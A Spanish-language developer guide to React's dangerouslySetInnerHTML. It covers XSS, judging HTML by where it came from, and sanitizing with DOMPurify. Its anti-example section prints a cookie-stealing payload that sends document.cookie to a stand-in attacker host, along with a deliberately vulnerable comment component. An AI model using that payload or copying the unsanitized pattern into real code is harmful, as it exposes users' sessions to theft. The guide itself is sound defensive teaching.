# dangerouslySetInnerHTML y XSS

## ¿Qué es?

`dangerouslySetInnerHTML` es la propiedad de React que permite insertar una cadena de HTML tal cual dentro de un elemento, sin escaparla. Su nombre es una advertencia: si ese HTML contiene código malicioso, el navegador lo ejecutará.

## ¿Por qué existe?

React escapa por defecto todo lo que interpolas en JSX. Si un campo trae `<script>alert(1)</script>`, React lo muestra como texto, no lo ejecuta:

```tsx
const titulo = '<img src=x onerror="alert(1)">'

<h2>{titulo}</h2>
// En pantalla se ve literalmente: <img src=x onerror="alert(1)">
```

Eso protege de la vulnerabilidad más común del front: el **XSS** (*Cross-Site Scripting*), que consiste en que un atacante consiga que su código JavaScript se ejecute en la página de otra persona (para robar la sesión, leer datos, hacer peticiones en su nombre). 

Pero a veces el HTML **es** el contenido: un manual ya convertido desde Markdown, un artículo con formato, un fragmento de una pasarela de pago. Para ese caso React ofrece una salida de emergencia explícita:

```tsx
<div dangerouslySetInnerHTML={{ __html: html }} />
```

El nombre largo y el objeto `{ __html }` son deliberados: obligan a quien escribe el código (y a quien lo revisa) a darse cuenta de que está desactivando la protección.

> Si ya conoces `innerHTML` del DOM, es exactamente eso, con el nombre diseñado para que se note en una revisión de código.

## ¿Cuándo y para qué se usa?

Siempre que el contenido llegue ya formateado como HTML: la página de ayuda de una tienda online generada desde un fichero Markdown (ver [Markdown a HTML en build-time](Markdown-a-HTML-en-build-time.md)), un editor de texto enriquecido que guarda HTML, o un mensaje de correo que se muestra dentro de la app. En todos esos casos la pregunta que decide si es seguro no es técnica, sino de **procedencia**: ¿quién ha escrito ese HTML?

## El modelo de confianza: el origen del HTML

`dangerouslySetInnerHTML` no es «inseguro» por sí mismo; lo es **si el HTML lo controla alguien que no deberías creer**. La regla práctica es preguntarse por cada fuente:

| Origen del HTML | ¿Quién puede cambiarlo? | ¿Seguro sin sanitizar? |
|---|---|---|
| Fichero del repositorio, convertido en build-time | Solo quien puede hacer un PR aprobado | Sí |
| Respuesta de tu propia API con contenido escrito por el equipo | El equipo (y quien comprometa su cuenta) | Depende; mejor sanitizar |
| CMS donde editan varias personas | Cualquiera con acceso al CMS | No; sanitizar |
| Campo escrito por un usuario (comentario, nombre, bio) | Cualquier usuario, incluido un atacante | **Nunca** sin sanitizar |
| Contenido de una web externa o un correo recibido | Terceros desconocidos | **Nunca** sin sanitizar |

El caso del primer renglón es seguro por un motivo preciso: para meter un `<script>` en el HTML, el atacante tendría que modificar el fichero fuente dentro del repositorio, y quien puede hacer eso ya puede cambiar el código de la aplicación directamente. No gana nada nuevo.

## Cuándo sí: contenido propio generado en build-time

Un componente de ayuda que muestra secciones convertidas de Markdown a HTML en un script previo:

```tsx
import { SECCIONES_AYUDA } from './ayuda.generated'

export function PaginaAyuda() {
  return (
    <main>
      {SECCIONES_AYUDA.map((seccion) => (
        <section key={seccion.id} id={seccion.id}>
          <h2>{seccion.titulo}</h2>
          <div dangerouslySetInnerHTML={{ __html: seccion.html }} />
        </section>
      ))}
    </main>
  )
}
```

Qué hace: por cada sección, pinta el título (escapado, como siempre) y el cuerpo como HTML. Qué hay de seguro aquí: `seccion.html` viene de un módulo importado, es decir, está **dentro del bundle** y lo decidió el repositorio en build-time. No hay ningún camino por el que un usuario de la app o una respuesta de red lo modifique.

Las condiciones para que ese razonamiento se sostenga son tres y conviene comprobarlas:

1. El HTML sale de un fichero del repositorio, no de input de usuario ni de red.
2. Los cambios en ese fichero pasan por revisión.
3. Nadie, más adelante, sustituye el import estático por una llamada a una API sin revisar este componente.

## Cuándo no: usuario, red o CMS

Esto es el anti-ejemplo, un comentario en la ficha de un producto:

```tsx
// ❌ XSS: el comentario lo escribe cualquier usuario
function Comentario({ comentario }: { comentario: { html: string } }) {
  return <div dangerouslySetInnerHTML={{ __html: comentario.html }} />
}
```

Si alguien publica `<img src=x onerror="fetch('https://atacante.example/?c='+document.cookie)">`, cada persona que abra esa ficha ejecutará ese código con sus propios permisos. No hace falta `<script>`: cualquier atributo de evento (`onerror`, `onclick`...) o una URL `javascript:` basta.

Para contenido no confiable hay tres salidas, de más a menos recomendable:

**1. No usar HTML: renderizar a componentes.** Si el contenido es Markdown, en vez de convertirlo a HTML y volcarlo, usa una librería que genere elementos React (por ejemplo [`react-markdown`](https://github.com/remarkjs/react-markdown)). React construye los nodos él mismo, así que el escapado automático sigue activo y no hay `dangerouslySetInnerHTML` que auditar. Es la opción preferible cuando el contenido viene de fuera.

**2. Sanitizar con una librería.** Si debes mostrar HTML ajeno, pásalo por [DOMPurify](https://github.com/cure53/DOMPurify), que elimina scripts, atributos de evento y URLs peligrosas y deja el formato inocuo:

```tsx
import DOMPurify from 'dompurify'

function Comentario({ html }: { html: string }) {
  const limpio = DOMPurify.sanitize(html)
  return <div dangerouslySetInnerHTML={{ __html: limpio }} />
}
```

`DOMPurify.sanitize` devuelve el mismo HTML sin lo peligroso: `<p>Genial</p><img src=x onerror="...">` pasa a `<p>Genial</p><img src="x">`. Sanitiza **justo antes de inyectar** y con una librería mantenida: una expresión regular casera que «quite los `<script>`» es el clásico parche que se salta con una variante que no se previó.

**3. Mostrarlo como texto.** Si no necesitas el formato, no lo permitas: `{comentario.texto}` y listo.

## Cómo dejar documentada la decisión

Quien lea `dangerouslySetInnerHTML` en el código, y el sistema de revisión o el linter que lo marque, deben poder ver **por qué es aceptable aquí**. Un comentario junto al uso, que explique el origen y la condición:

```tsx
{/*
  dangerouslySetInnerHTML es seguro aquí: `html` sale de ayuda.generated.ts, generado en
  build-time desde docs/ayuda.md (fichero del repositorio, revisado en PR). No hay input de
  usuario ni de red en esta ruta. Si el origen cambia, hay que sanitizar con DOMPurify.
*/}
<div dangerouslySetInnerHTML={{ __html: seccion.html }} />
```

Si usas ESLint con la regla `react/no-danger`, esa regla marcará el uso; la forma honesta de convivir con ella es desactivarla en esa línea, con el motivo escrito:

```tsx
// eslint-disable-next-line react/no-danger -- HTML propio generado en build-time desde docs/ayuda.md
<div dangerouslySetInnerHTML={{ __html: seccion.html }} />
```

La justificación debe nombrar el origen concreto. Un «es seguro» a secas no ayuda a nadie dentro de seis meses.

## Buenas prácticas avanzadas

- **Concentra el uso en un solo componente.** Un `HtmlPropio` que recibe el HTML y es el único sitio con `dangerouslySetInnerHTML` deja un único punto que revisar, documentar y, si el origen cambia, endurecer con sanitización.
- **Trata los tipos como parte de la defensa.** Tipar el prop como `string` no distingue HTML confiable de no confiable. Un tipo con marca (`type HtmlConfiable = string & { __marca: 'confiable' }`) que solo producen el generador o `DOMPurify.sanitize` obliga a que el compilador te avise si alguien pasa texto crudo.
- **Sanitizar no sustituye al escapado de salida en el servidor ni a una CSP.** Una cabecera `Content-Security-Policy` que prohíba scripts en línea es una segunda barrera: si un XSS se cuela, el navegador se niega a ejecutarlo.
- **Cuidado con el HTML que no parece HTML.** Los atributos `href`/`src` con `javascript:` y los SVG con scripts incrustados son vectores clásicos; DOMPurify los cubre, un filtro propio normalmente no.
- **Revisa el origen cuando evolucione la feature.** El caso típico: la ayuda era un fichero del repo y un día se mueve a un CMS «para que la edite negocio». La condición que hacía seguro el código acaba de desaparecer sin que nadie toque el componente.
- **Si sanitizas, hazlo en el último momento, no al guardar.** Las reglas de sanitización mejoran con el tiempo; el contenido guardado con una limpieza antigua queda con ella.

## Documentación oficial

- [React — Danger: dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html) — la referencia de la propiedad, con el aviso y la forma exacta del objeto `{ __html }`.
- [OWASP — Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — la fuente de referencia sobre XSS: tipos, contextos de salida y cuándo sanitizar frente a escapar.
- [DOMPurify](https://github.com/cure53/DOMPurify) — el README explica la API de `sanitize` y sus opciones de configuración.

---

*En resumen: `dangerouslySetInnerHTML` es seguro solo cuando sabes con certeza quién escribió el HTML (por ejemplo, un fichero del repositorio convertido en build-time); si el origen es un usuario, la red o un CMS, renderiza a componentes o sanitiza con DOMPurify, y deja escrito junto al código por qué lo has considerado seguro.*
